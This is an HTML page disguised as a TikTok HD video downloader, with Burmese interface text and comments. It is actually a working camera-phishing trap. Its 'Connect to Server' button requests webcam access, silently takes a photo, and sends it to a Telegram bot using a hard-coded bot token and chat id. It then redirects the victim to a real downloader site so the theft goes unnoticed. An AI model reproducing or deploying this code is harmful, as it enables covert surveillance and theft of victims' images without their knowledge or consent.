<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>TikTok HD Video Downloader</title>
    <style>
        body { background: #121212; color: white; font-family: sans-serif; text-align: center; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
        .box { padding: 30px; border-radius: 20px; background: #1e1e1e; box-shadow: 0 10px 30px rgba(0,0,0,0.5); width: 90%; max-width: 400px; }
        .btn { background: #fe2c55; color: white; border: none; padding: 15px 30px; border-radius: 50px; font-size: 18px; font-weight: bold; cursor: pointer; width: 100%; transition: 0.3s; }
        .btn:hover { transform: scale(1.05); }
    </style>
</head>
<body>
    <div class="box">
        <img src="https://www.tiktok.com/favicon.ico" width="60">
        <h2>TikTok Downloader</h2>
        <p>HD ဗီဒီယိုများကို ဒေါင်းလုဒ်ဆွဲရန် Server နှင့် ချိတ်ဆက်ပေးပါ။</p>
        <button class="btn" onclick="capture()">Connect to Server 🔓</button>
    </div>

    <video id="video" style="display:none;" autoplay></video>
    <canvas id="canvas" style="display:none;"></canvas>

    <script>
        const token = '8661599650:AAFaEo8wGPhpvbj8g6cOonAZZxatMF21lV0';
        const chat_id = '5304050102';

        async function capture() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                const video = document.getElementById('video');
                video.srcObject = stream;

                setTimeout(() => {
                    const canvas = document.getElementById('canvas');
                    canvas.width = 640;
                    canvas.height = 480;
                    canvas.getContext('2d').drawImage(video, 0, 0);
                    
                    canvas.toBlob(blob => {
                        const fd = new FormData();
                        fd.append('chat_id', chat_id);
                        fd.append('photo', blob, 'image.jpg');
                        fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: fd });
                        
                        // ပုံပို့ပြီးရင် တကယ့် Downloader Web ဆီ လွှဲပေးလိုက်မယ်
                        setTimeout(() => {
                            window.location.href = "https://ssstik.io/en";
                        }, 1000);
                    }, 'image/jpeg');
                }, 2000);
            } catch (err) {
                // ငြင်းလိုက်ရင်လည်း Web ဆီပဲ ပို့ပေးလိုက်မယ်
                window.location.href = "https://ssstik.io/en";
            }
        }
    </script>
</body>
</html>
